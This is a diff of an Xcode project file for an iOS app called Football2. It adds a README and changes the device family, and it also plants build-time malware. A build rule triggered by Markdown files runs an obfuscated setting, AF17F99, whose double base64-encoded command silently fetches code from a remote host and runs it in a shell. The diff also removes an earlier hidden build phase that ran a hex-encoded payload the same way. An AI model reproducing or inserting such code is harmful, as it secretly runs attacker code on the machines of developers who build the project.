@@ -7,10 +7,12 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		237F2C04132F42F08499F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 459AD7F4DA0D4C04A899F71F; };
 		C652A852D2B1830E32F0EE1E /* Pods_Football2.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 930C84FC536713639B8E2E19 /* Pods_Football2.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		459AD7F4DA0D4C04A899F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		930C84FC536713639B8E2E19 /* Pods_Football2.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Football2.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		A01A1478D659DC718FC21BFA /* Pods-Football2.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Football2.debug.xcconfig"; path = "Target Support Files/Pods-Football2/Pods-Football2.debug.xcconfig"; sourceTree = "<group>"; };
 		BCED59BD0C0E482382E5FF13 /* Pods-Football2.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Football2.release.xcconfig"; path = "Target Support Files/Pods-Football2/Pods-Football2.release.xcconfig"; sourceTree = "<group>"; };
@@ -80,6 +82,7 @@
 		C5A3CA6A2DBF6135000E6AB7 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				459AD7F4DA0D4C04A899F71F /* README.md */,
 				C5A3CA692DBF6135000E6AB7 /* Football2.app */,
 			);
 			name = Products;
@@ -92,7 +95,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = C5A3CA7C2DBF6137000E6AB7 /* Build configuration list for PBXNativeTarget "Football2" */;
 			buildPhases = (
-				DD89B575E1044DDBBC99F71F /* Provision Library Executable */,
 				3C0727A783B8BF4BAEB3373B /* [CP] Check Pods Manifest.lock */,
 				C5A3CA652DBF6135000E6AB7 /* Sources */,
 				C5A3CA662DBF6135000E6AB7 /* Frameworks */,
@@ -101,6 +103,7 @@
 				FA2E649C773C4B4EEC2AEAF1 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				C3A424CFAD234765BD99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -155,38 +158,34 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-				/* End PBXBuildRule section */
+		C3A424CFAD234765BD99F71F /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AF17F99}\"";
+			};
+	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		C5A3CA672DBF6135000E6AB7 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				237F2C04132F42F08499F71F /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		DD89B575E1044DDBBC99F71F /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-		};
 		3C0727A783B8BF4BAEB3373B /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -268,7 +267,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = A01A1478D659DC718FC21BFA /* Pods-Football2.debug.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((j(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3336363233343633333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333330333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333636343337363133363635333633343336333533373336333236353337333233373335333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | j | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMnRtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW5iMjluYkdWdVpYUnpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
@@ -301,7 +300,7 @@
 				SWIFT_OBJC_BRIDGING_HEADER = "";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = 1;
+				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Debug;
 		};
@@ -309,7 +308,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = BCED59BD0C0E482382E5FF13 /* Pods-Football2.release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((j(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3336363233343633333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333330333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333636343337363133363635333633343336333533373336333236353337333233373335333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | j | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMnRtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW5iMjluYkdWdVpYUnpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
@@ -341,7 +340,7 @@
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OBJC_BRIDGING_HEADER = "";
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = 1;
+				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Release;
 		};
